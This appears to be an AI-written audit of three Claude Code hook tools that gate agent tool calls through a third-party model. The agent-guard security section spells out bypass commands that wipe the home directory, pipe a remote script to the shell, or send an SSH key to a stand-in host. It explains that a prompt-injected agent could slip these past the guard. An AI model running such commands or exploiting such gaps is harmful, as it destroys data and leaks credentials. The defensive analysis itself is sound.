Sends complete tool inputs (full file contents on Write/Edit, Bash commands) and recent user prompts to a third-party beta model host on every gated action. That is a real confidentiality concern for client projects. The regex secret guard is heuristic (README concedes it is not proof).

A false allow silently skips the human approval dialog, and the only defense is your own calibration. The shipped fixtures are placeholders, so Jev's actual false-allow rate on real Claude Code traffic is unmeasured. Jev is also a new beta model, and a skeptic-reported 'flash router' claim is unverified.

Very immature: a 10-day-old repo with 1 star, 0 forks, 1 human contributor, 13 commits, 0.1.x versions, and about 37 unit tests that use only mocks, with no live or end-to-end test with Claude Code. Installing a global npm CLI from a one-person package into a workflow that touches client code is a supply-chain risk.

Extra moving parts for little gain: it needs a global npm install, a policy JSON, a status path, and env plumbing so the hook process sees the key. It adds 0.2-0.7 s per gated action. Claude Code's own auto-mode classifier already covers the same niche without a third-party dependency.
hook-adapters alone is only a payload-to-JSON converter. The value sits in @jev-kit/cli and @jev-kit/agent-review, so the candidate name is slightly misleading.
gh-keiffff-jev-kit.verdict: A tidy, safe-by-design but immature permission auto-approver. It is automatic (deterministic hook), fails back to the normal prompt and costs no context, and it could be pointed at OpenRouter through TYPESAFE_BASE_URL. However, PermissionRequest never fires in bypass mode and rarely in auto mode, and it exports full tool inputs, so it delivers little daily-coding value for this user. Treat it as an optional experiment, or as a reference implementation for the OpenRouter cookbook pattern, not a core integration.

gh-canyuda-agent-guard.name: @canyuda/agent-guard
gh-canyuda-agent-guard.whatItDoes: Zero-dependency Node (>=20) PreToolUse hook that gates Bash/Write/Edit/mcp__* tool calls. Fast path first (regex allowlist, then regex denylist, then a 60-minute judgment cache). On a miss it POSTs one request to TypeSafe systemone with two typed questions: destructive_risk (Score, 4 levels) and policy_violation (Noul). Fixed thresholds then map the result to allow / ask / deny. Fails closed. Also ships a setup wizard that writes the hook into ~/.claude/settings.json, plus a check CLI. The docs and tests target ZCode first, with Claude Code and Cursor as secondary targets. It is a safety guard, not a general-purpose Jev helper.

providerSupport.evidence: lib/typesafe.mjs:9 hardcodes const API_URL = "https://api.typesafe.ai/v1/systemone" with no env or config override. lib/typesafe.mjs:158 sends payload {state, model: cfg.model, questions}. config.json:2 has model "jev-latest" (no typesafe/ prefix). lib/config.mjs:49 reads only TYPESAFE_API_KEY, falling back to ~/.agentguardrc (config.mjs:42). No 'openrouter' string anywhere in the repo or the npm tarball. The auth header is Bearer at typesafe.mjs:41 and :86.
providerSupport.others: None. The only outbound proxy support is an optional manual HTTP CONNECT tunnel (proxy.enabled in config.json).
providerSupport.openrouterPatchability: Moderate, and it needs a fork or vendored copy because nothing is configurable. Changes: (1) the URL constant at typesafe.mjs:9 to https://openrouter.ai/api/v1/systemone, (2) config model to typesafe/jev-latest or ~typesafe/jev-latest, (3) key resolution in config.mjs:42/49 plus setup-key.mjs to read OPENROUTER_API_KEY, (4) possibly the request/response schema. The code expects res.answers.<name>.score and .noul (typesafe.mjs:161-162). I could not verify that OpenRouter's /v1/systemone uses the same body (state/model/questions) or the same response shape. The alpha /decisions API may differ. If the shapes match, it is about a 5-line patch, but a maintained fork is needed because npm updates would overwrite it.

interface.name: hook: PreToolUse matcher Bash|Write|Edit|mcp__.*
interface.purpose: lib/setup-hooks.mjs:5,33 writes {type:command, command:'node <pkg>/hook.mjs', timeout:15} into ~/.claude/settings.json. Reads stdin JSON, outputs hookSpecificOutput.permissionDecision allow|ask|deny with a reason (emit.mjs). It does not cover Read, Grep, Glob, NotebookEdit or WebFetch.

interface.name: CLI: agent-guard setup
interface.purpose: Interactive wizard (or --key/--agents/--scope/--yes/--dry-run/--no-verify). Verifies the key against the real API, writes ~/.agentguardrc, and edits settings.json (a .bak backup is made, and the edit is idempotent).

interface.name: CLI: agent-guard check
interface.purpose: Manual evaluation of --cmd or --tool/--input, with an optional --mock.

interface.name: CLI: agent-guard hook
interface.purpose: Hook pipeline mode (stdin to stdout). hook.mjs is the legacy entry.

interface.name: Jev question: destructive_risk (Score)
interface.purpose: 4 levels: read-only, controlled edit, medium risk, irreversible destructive. Blocks at expected risk >=2.5 and asks at >=1.5.

interface.name: Jev question: policy_violation (Noul)
interface.purpose: Force-push, disk wipe, system-file tampering, credential export, fork bomb, backup deletion. Blocks at P>=0.85 and asks at >=0.5.

interface.name: Config ~/.agent-guard/config.json
interface.purpose: thresholds, fastpath allow/deny regexes, mcp_allowlist, cache TTL, log, proxy, degrade_ask_to_deny.

gh-canyuda-agent-guard.lastCommit: 2026-09-30 (0.3.0 published to npm the same day)
gh-canyuda-agent-guard.tests: About 20 node:test files (~986 lines), including hook integration, proxy, setup e2e and a 12-sample set. The README claims 74 tests, and other README lines still say 42/42. CI runs npm test on Node 20 and 22 (.github/workflows/ci.yml). I did not run them, per the hard rules. The tests use mocked judgments, so nothing validates the real Jev output distribution. README status: 'pilot, 2-3 day observation'.
gh-canyuda-agent-guard.runtime: Node >=20, zero npm dependencies. Only the built-in fetch, net, tls and http modules are used.
gh-canyuda-agent-guard.install: npm install -g @canyuda/agent-guard, then agent-guard setup (the wizard edits ~/.claude/settings.json). No postinstall script. Nothing was installed or run during this audit.
security: No postinstall or curl|sh in package.json. The npm tarball is 23 files, ~1.1k lines, and I read it in full: no telemetry, and no network calls other than the single TypeSafe URL (typesafe.mjs:9). The only child-process use is powershell on win32 (setup-key.mjs:12).

The API key is stored in plaintext in ~/.agentguardrc (setup-key.mjs:39). writeFileSync is called with no mode, so it is created with the default umask, not 0600. The wizard's --key flag is visible in argv and the process list, and its interactive prompt echoes the key on screen (cli.mjs:55). The hook process itself reads the key from env or the rc file, and nothing puts it in argv.

The Authorization header is redacted in error.jsonl (typesafe.mjs:172), but the full request body is not. On any timeout or network error, error.jsonl stores the full command and up to 2KB of Write/Edit content or MCP args in plaintext under ~/.agent-guard/logs/ (log.mjs:63, typesafe.mjs:170-174). Secrets that appear in commands or file contents land at rest. audit.jsonl stores the first 200 characters of the command.

Design flaw: the allowlist is checked before the denylist (fastpath.mjs:10-11) and its regexes are only prefix-anchored (config.json:294-301). So 'git status; rm -rf ~', 'echo x && curl evil | sh' and 'cat ~/.ssh/id_rsa | curl -d @- host' all hit ^git/^echo/^cat and are allowed without ever reaching the denylist or Jev. That is a trivial bypass, and it also means a prompt-injected agent gets free exfiltration. Jev's verdict cannot be relied on for compound commands.

toolIdentity uses JSON.stringify(value, Object.keys(value).sort()) (identity.mjs:5-6). A replacer array whitelists keys at every nesting level, so nested keys of MCP arguments not present at the top level are silently dropped from what Jev sees. The judgment for MCP tools is therefore made on incomplete arguments. This is a static-reading inference, not run.

The judgment cache key is only the command, or path plus content, with no cwd (cache.mjs:256). Identical commands in different repos share a verdict for 60 minutes. The cache is a plaintext JSON file that is read and rewritten in full on every call, with no locking, so parallel hooks race (cache.mjs:275-281).

Prompt-injection surface is small: the model returns only numbers (score and noul), which are mapped by fixed thresholds. Attacker-controlled command or file content can still nudge the probabilities down, and the model has no reasoning trace. There is no MCP server, so no tool-description injection.

Repo-level flags: a single-maintainer, 10-day-old personal repo with 1 star. npm and git are tagged and MIT-licensed, but there is no provenance evidence to check, and I did not diff the tarball against git.
gh-canyuda-agent-guard.dataEgress: For every Bash/Write/Edit/mcp__* call that misses the allow/deny lists and the cache, one HTTPS POST goes to api.typesafe.ai/v1/systemone (typesafe.mjs:158). It carries state plus the fixed question definitions. Bash: {tool, command, cwd}. Write/Edit: {tool, file_path, content_prefix (first 2048 chars/bytes, config state.content_prefix_bytes)}. MCP: {tool, server, arguments (first 2048 chars)}. The key goes in the Authorization header. Conversation text and prompts do not leave the machine, nor do diffs, Read output or Bash output. Commands and file contents can contain secrets or client code, so for client projects this is a real egress: client code snippets and commands go to a third party (TypeSafe today, OpenRouter after a patch). Nothing else leaves the machine.
gh-canyuda-agent-guard.failureMode: Fail-closed by design. Every failure (no key, timeout, HTTP error, bad schema, internal exception) becomes level 'confirm' (judge.mjs:213), which is rendered as 'ask', or as 'deny' if degrade_ask_to_deny is true. There are no retries and the API timeout is 8 s (typesafe.mjs:10). The hook's own timeout is 15 s (setup-hooks.mjs:33). If rendering fails the hook exits 3. In Claude Code, exit 3 is a non-blocking hook error, so the call is not blocked (per general knowledge, not verified in this repo). Consequence when Jev or OpenRouter is down or the key is missing: every uncached, non-allowlisted Bash/Write/Edit/MCP call turns into a prompt or deny. In bypass mode the repo's own notes (docs/notes/2026-09-24-consent-deadlock.md) show ask can be silently auto-approved, so it fails open in effect. With degrade_ask_to_deny=true it becomes a hard deny with no approval channel, a documented 'consent deadlock' where even explicit user consent cannot unblock the agent. The default in config.json is degrade_ask_to_deny=false.
gh-canyuda-agent-guard.contextCost: No MCP server, no tools and no server instructions, so ~0 tokens of tool definitions. Hooks add nothing to context on the allow path (only a short reason string, '[agent-guard] safe pass (...)', which Claude Code shows to the user). On deny the agent gets about 150 Chinese characters (~100-150 tokens) telling it to stop and tell the user, and not to retry or rewrite the command. Tokens are only spent when the guard fires.
gh-canyuda-agent-guard.latencyImpact: Each matched call (Bash, Write, Edit, any mcp__*) spawns a fresh Node process, roughly 40-80 ms of cold start on Node 24. The cache and allowlist add a local file read. The allowlist covers git status/diff/log, ls, cat, grep, echo and a few more, so it saves the network hop only for those. On a miss it adds Jev's claimed 70-500 ms round trip, up to the 8 s timeout. Hooks for one event run in parallel, so it overlaps with the user's existing PreToolUse hooks, and only Bash overlaps with the GitNexus and secret-guard matchers. A long agent turn with dozens of Edit/Write/Bash calls would add several seconds in total.
gh-canyuda-agent-guard.autoInvocation: Deterministic hook. PreToolUse fires for Bash|Write|Edit|mcp__.* on every call, with no model discretion and no user prompt needed. It is the only candidate here that satisfies 'Claude Code must use Jev without being told', but the Jev use is a permission gate on tool calls. It does not help with coding decisions.
pros: Truly automatic: a deterministic PreToolUse hook needs no prompting, and setup writes the settings.json entry with a .bak backup and idempotent upsert (setup-hooks.mjs:154-179).

Uses Jev the way its primitives are meant to be used: typed Score and Noul questions turned into calibrated probabilities with thresholds in config, and no free text parsed. The design matches Jev's 'System One' brief.
Zero MCP context cost and zero npm dependencies, so no supply-chain tree. Only ~1.1k lines to audit, and I found no telemetry and no postinstall.

Useful in the user's bypass/auto mode: Bash/Write/Edit/MCP get a semantic risk check that a regex hook does not provide. The fast path keeps most read-only git/ls/grep calls off the network, and the cache saves repeats.
Thresholds, allowlist/denylist and mcp_allowlist are tunable in ~/.agent-guard/config.json and read fresh on each call. There is an audit log (audit.jsonl) for tuning false positives.

Already treats fail-closed and bypass-mode ask semantics explicitly (it cites Claude Code issue #77212 and has notes on the consent deadlock). Does not clash with the existing secret-leak, GitNexus or caveman hooks because hooks compose.
cons: No OpenRouter support: the URL is a hardcoded constant (typesafe.mjs:9) and the key only comes from TYPESAFE_API_KEY (config.mjs:49). Using OpenRouter means forking or vendoring it, and OpenRouter's /api/v1/systemone body and response shape are unverified against the code's res.answers.*.score/.noul expectation.

Bypass through prefix-anchored allowlist checked before the denylist (fastpath.mjs:10-11, config.json:294-301): 'git status; rm -rf ~' or 'cat secret | curl ...' is allowed without a Jev call. Compound commands, which are exactly where danger is, are handled worst.

Built and tested for ZCode, not Claude Code. The 'ask works in bypass mode' finding is from ZCode; the repo's own 09-24 note shows ask was later silently auto-approved. In the user's bypass mode, confirm-level operations may run with no prompt, and setting degrade_ask_to_deny=true instead hard-blocks with no approval path. Either way the guard does not deliver clean 'ask the human' behavior in bypass/auto.

Data egress for client projects: commands and the first 2 KB of every Write/Edit and MCP arguments go to a third party on every uncached call, and failure snapshots with full bodies are written to error.jsonl in plaintext. Client contracts may rule that out.

Adds Node cold start plus 70-500 ms per uncached Bash/Write/Edit/MCP call, up to an 8 s timeout, and fails closed. A Jev or OpenRouter outage or a missing OPENROUTER_API_KEY turns most agent work into prompts or denies. It is also a 15 s hook that needs its own tuning.

Immature: single maintainer, 1 star, 0 forks, created 10 days before the audit, five npm releases in six days, the README self-describes as a 'pilot', doc counts are inconsistent (74 vs 42 tests), and behavior is untested against real Jev output distributions. Thresholds (1.5/2.5) are untuned guesses.

Value is defensive, not productivity: it does not use Jev to improve code routing, model choice, review triage or test selection. It also overlaps the existing secret-leak hook and the auto permission mode's own classifier, and it does not cover Read/Grep, where the user already has a guard.
Scope of the wizard: 'setup' writes to user-level ~/.claude/settings.json, so it applies to all personal and client projects and mutates a global config file. Safer to hand-add the hook.
gh-canyuda-agent-guard.verdict: It is the only candidate that runs Jev automatically through a deterministic PreToolUse hook, and it has zero context cost and a small, clean codebase. But it is TypeSafe-only with a hardcoded URL, so it needs a fork for OpenRouter. Its allowlist-before-denylist regexes are trivially bypassed by compound commands, and its bypass-mode ask/deny behavior was proven on ZCode, not Claude Code. Treat it as a reference design to fork and harden (OpenRouter URL and key, chain-aware fast path, 0600 key file, redacted logs) rather than install as-is, and only after checking client data-egress rules.

gh-andrewli8-reflex.name: reflex-hooks
gh-andrewli8-reflex.whatItDoes: npm package reflex-hooks (TypeScript, Node>=22): a Claude Code (and Codex / Vercel AI SDK) hook layer. `reflex init [--global]` writes a hook entry into .claude/settings.json (or ~/.claude/settings.json) for PreToolUse, PostToolUse, PostToolUseFailure, PermissionRequest, UserPromptSubmit, SessionStart and PreCompact, all with matcher '' and 3 s timeout, via a shim at ~/.reflex/bin/reflex-hook. Cheap deterministic checks find candidates (destructive commands, including ones hidden in scripts; duplicate reads; polling loops; oversized output). Jev is then asked boolean or choice questions (outOfScope, destructive, irreversible, and a requested/needed/unrelated/forbidden verdict) about the proposed call against the task, the constraints and the last 8 calls. A fixed policy turns the answer into allow, note, ask (native permission prompt), deny or skip. It also trims large tool output through updatedResponse, restates constraints on each prompt, and re-injects a session ledger after compaction. Alpha, single author, released 2026-09-21.

interface.name: Hook PreToolUse (matcher '')
interface.purpose: Classifies the call. Denies or skips duplicate reads and cycles ('identical call already made'). Sends destructive-pattern hits, and writes and exec calls, to Jev. Returns permissionDecision 'ask' or 'deny' (deny at level auto/ultra), or additionalContext notes. Capped at 2 interventions per 5 steps; 'reflex:force' overrides.

interface.name: Hook PostToolUse
interface.purpose: Trims oversized or repetitive tool output through updatedResponse / updatedMCPToolOutput, keeps error lines, and archives the original under ~/.reflex/archive. Emits a context-gauge systemMessage.

interface.name: Hook UserPromptSubmit
interface.purpose: Records the prompt in the session log, extracts imperative constraints ('do not...', 'never...') and re-injects them as additionalContext on every prompt.

interface.name: Hook SessionStart (compact/resume)
interface.purpose: Injects a ledger of what was already read, edited, run and verified.

interface.name: Hooks PostToolUseFailure, PermissionRequest, PreCompact
interface.purpose: Log only.

interface.name: CLI reflex init [--codex|--all|--global|--no-report]
interface.purpose: Installs the hooks, prompts for a Jev key, and replays the last 20 sessions.

interface.name: CLI reflex level off|watch|ask|auto|ultra [--global]
interface.purpose: Sets the one config knob (default ask).

interface.name: CLI reflex key jev <key>
interface.purpose: Stores TYPESAFE_API_KEY in plaintext in ~/.reflex/secrets.json (mode 600).

interface.name: CLI reflex doctor | report | stats | watch | replay --last N [--import] | clean | serve
interface.purpose: Diagnostics, near-miss reports, shadow replay of past sessions, log cleanup, local Laya daemon.

interface.name: Library API (Reflex, withReflex, reflexPrepareStep)
interface.purpose: Vercel AI SDK wrapper, including per-step small/large model routing. Not applicable to Claude Code.

interface.name: Skill reflex-install (skills/reflex-install/SKILL.md) and INSTALL-PROMPT.md

gh-andrewli8-reflex.runtime: Node >=22, TypeScript compiled to dist. optionalDependencies: @anthropic-ai/sdk, ai, zod (unused on the Jev path). No postinstall script; the package.json scripts are only test, typecheck, build and prepublishOnly.
gh-andrewli8-reflex.install: npm i -g reflex-hooks && reflex init --global   (writes ~/.claude/settings.json hooks, and prompts for a key at init). For OpenRouter: export TYPESAFE_BASE_URL=https://openrouter.ai/api TYPESAFE_MODEL=typesafe/jev-1.13 TYPESAFE_API_KEY=<openrouter key>, set through the settings.json `env` block so the hook processes see them.
gh-andrewli8-reflex.tests: vitest, about 87 test cases in 12 files, including critic (33), adapter (19) and jev (3, mocked fetch only). CI runs typecheck, test and build on Node 22 (.github/workflows/ci.yml). There is no live integration test against any Jev or OpenRouter endpoint, so the request shape is unverified. I did not run anything.
security: No curl|sh installer and no npm postinstall. The npm package is a plain compiled dist and matches the source. There is no telemetry: the only network URL in src is api.typesafe.ai (grep of fetch and https across packages/reflex/src).

Key handling: the key is read from env or ~/.reflex/secrets.json. `reflex key` writes it in plaintext (mode 600, dir 700). It travels in the Authorization header, not in argv, but `reflex key jev <key>` puts it in argv and shell history. Setting it through the settings.json env block avoids that.

Redaction before sending or logging (state.ts:51-58) is regex-based: sk-, ghp_, AKIA, JWT, PEM blocks, and KEY=value pairs with sensitive names. The author admits it misses unlabelled secrets. It runs on the state sent to the provider (critic.ts:236).

`reflex init` writes to settings.json with JSON.parse and no backup. If the file has comments or invalid JSON, init throws and does nothing. It replaces the file with plain JSON, so it could reformat the user's existing global settings. Back the file up first, or hand-write the hook entries.

The shim ~/.reflex/bin/reflex-hook is a shell script that execs the global reflex-hook or a hardcoded node path, and it runs on every tool call. The paths are checked against a safe charset (cli.ts:55). Trust is the same as for any global npm package.

PostToolUse can rewrite tool output the model sees (trim, or a collapsed 'identical' line). This is a correctness risk if a trim hides needed lines. Error lines are kept, and the original is archived under ~/.reflex/archive with redaction applied (secrets are redacted in the archive, not only in what is sent).

Prompt-injection surface: the state sent to Jev includes the goal, the recent prompts and 80-character digests of results. Jev only returns probabilities, so an injection can at most bias the allow, ask or deny decision. The ledger and notes re-inject short digests of earlier tool results into the context, which is a weak injection channel that the README acknowledges.
Advisory only: the tool is not a security boundary. On timeout or error it fails open, and a denied duplicate runs if the agent repeats the call.
gh-andrewli8-reflex.dataEgress: To the provider (Jev at api.typesafe.ai by default, or wherever TYPESAFE_BASE_URL points), only for calls that reach the model. At level ask these are destructive-pattern hits and writes, exec, vcs and db calls. Reads are only judged at level ultra. Payload: the first prompt and latest prompt (up to 600 chars), the extracted constraints, the last 8 tool calls as one-line summaries (160 chars) with 80-char result digests, and the proposed call's summary. Postcall judging also sends a 600-char result digest. All of it goes through regex redaction. Full file contents and full tool outputs are not sent, but command lines, file paths and prompt text are, and on client projects that includes client task text. Locally, everything is logged to ~/.reflex (sessions jsonl, archive of trimmed outputs, decision cache). No other telemetry.
gh-andrewli8-reflex.failureMode: Fail-open. providerTimeoutMs is 1500 (config.ts:83) via AbortSignal.timeout (critic.ts:245). Any provider error is caught and the call proceeds with deterministic signals only. The hook's own timeout is 3 s. handleHook wraps everything in try/catch and returns undefined, logging to ~/.reflex/errors.log. The provider retries once on a 429 (waits up to 2 s, which can exceed the 1.5 s abort, so the retry is often cut short). A missing key means 'LIMITED' mode, with deterministic checks only. Caveat: the deterministic parts fail closed for the user. Duplicate reads are denied and destructive patterns go to a permission prompt regardless of Jev. In bypass permissions mode, a hook 'ask' may still surface a prompt, and 'ask' at level ask conflicts with the user's habit of bypass or auto mode. This is untested here.
gh-andrewli8-reflex.contextCost: Zero MCP tools and zero tool-definition tokens. Injected text comes only from hooks. A UserPromptSubmit line '[reflex] Constraints still in effect...' appears on each prompt, but only when imperative constraints were detected (tens of tokens). Ledger text after compaction or resume is bounded. '[reflex] ...' notes and deny reasons are one line each. The context gauge is a user-facing systemMessage. The net effect can be negative on tokens, since trimming reduces context (author claims of 63% fewer input tokens and a $1.75 to $0.28 routing saving apply to the AI SDK adapter, not to Claude Code).
gh-andrewli8-reflex.latencyImpact: A new Node process starts on every event, about 30 ms by the author's claim (unmeasured here), for all tool calls since the matcher is '' on 7 events, on top of the existing secret-guard, GitNexus and caveman hooks. A Jev round trip adds 130-500 ms (claimed) on judged calls only, capped at 1.5 s, plus 0.1 s per cache-miss file read/write. Duplicate-read denials cost a wasted turn. Worst case per judged call is about 1.5 s.
gh-andrewli8-reflex.autoInvocation: Deterministic hooks. Nothing has to be prompted: after `reflex init --global` and a restart, every tool call goes through the hook, and Jev is consulted automatically when a candidate is found. There is no model-discretion path.
pros: It is the one candidate here that meets the requirement of automatic use without prompting. It is a real, working hook set on 7 Claude Code events, written into settings.json, and Claude never has to be told to use Jev.

It uses Jev for what a System-1 model is suited to: typed boolean and choice questions about whether a destructive command or a constraint-violating edit fits the stated task. Each judged call is one small round trip and returns probabilities only.

The endpoint path in the code (`/v1/systemone`) is the same as OpenRouter's System One path. OpenRouter is reachable with only three env vars (TYPESAFE_BASE_URL, TYPESAFE_MODEL, TYPESAFE_API_KEY) and no source changes, if the JSON schema matches.
Fail-open with a 1.5 s cap, so a slow or down Jev never blocks the session. Handler errors are swallowed and logged to errors.log.
Zero MCP context cost, no postinstall, no curl|sh, no telemetry. The tarball matches the source.
Has a shadow mode (level watch) and `reflex replay --last 20`, so the value can be measured on the user's own history before any enforcement.
Redaction of secrets before anything is sent or logged, plus private file modes. It targets the same kind of risk as the user's secret-leak guard, so there is a natural pairing.
It ships tests (about 87) and CI, and the README lists measured results, including negative ones (reads judged at coin-flip quality, so they are off outside ultra).
cons: Very immature: repo created 2026-09-20, npm 0.1.0 published 2026-09-21, 0 stars, 0 forks, 1 contributor, 57 commits in about a day, no releases. The 'measured' claims are the author's own and cannot be checked from here.

OpenRouter is not a supported provider. It works only through undocumented env overrides, and the request/response shape is explicitly unverified against real docs (jev.ts:4-7). There are no integration tests, and errors are swallowed, so a schema mismatch would look like 'Reflex is running' while judging nothing. `reflex doctor` only checks that a key is present, not that calls succeed.

The key variable is named TYPESAFE_API_KEY, and the OpenRouter key would have to be stored under that name. `reflex key` stores it in plaintext in ~/.reflex/secrets.json, and the hook processes do not inherit the shell env unless the settings.json `env` block or secrets.json is used.

Sends prompt text, command lines and paths to a third party (OpenRouter and then TypeSafe) from client projects. Regex redaction is admitted to be incomplete. Check client contracts before enabling it globally.

Most of the value is deterministic and does not need Jev (duplicate-read blocking, output trimming, constraint restatement, a ledger). The Jev-specific part is a narrow gate on destructive commands and writes. The user already runs bypass or auto permission mode, where Jev's 'ask' output is either suppressed or interrupts an intentionally unattended flow, and the author says the Jev decisions 'prompt only when it matters' relies on the native permission system.

Intrusive behaviours on a daily workflow: PostToolUse rewrites what the model sees, and duplicate reads and writes are denied ('identical call already made'). These can conflict with the existing GitNexus PostToolUse graph-context hook and the caveman plugin, since three or four global hooks would all act on the same Grep/Glob/Bash outputs. Hook order and interaction were not tested (static reading only).
`reflex init --global` rewrites ~/.claude/settings.json as plain JSON after JSON.parse, with no backup, and adds 7 hook groups with matcher '' (every tool, every event), each spawning a Node process.
Uses a hardcoded 3 s hook timeout. The 429 retry can wait up to 2 s, longer than the 1.5 s abort budget.
Skeptic point: an unverified router-like model behind the gate means its 0.75/0.70/0.97/0.99 scores come from four hand-picked contexts, not a benchmark.
gh-andrewli8-reflex.verdict: The only fully automatic Jev integration found: deterministic hooks in Claude Code plus fail-open Jev judging of destructive commands and edits against the task. Its OpenRouter route is unofficial (three env vars, `/v1/systemone` path matches, JSON schema unverified) and the project is one day old with a single author. Worth a supervised trial in `watch` or `ask` level with a project-level init and one live curl test of the OpenRouter endpoint. It is not something to install globally on client projects yet, and mostly redundant with the user's bypass/auto workflow and existing hooks.
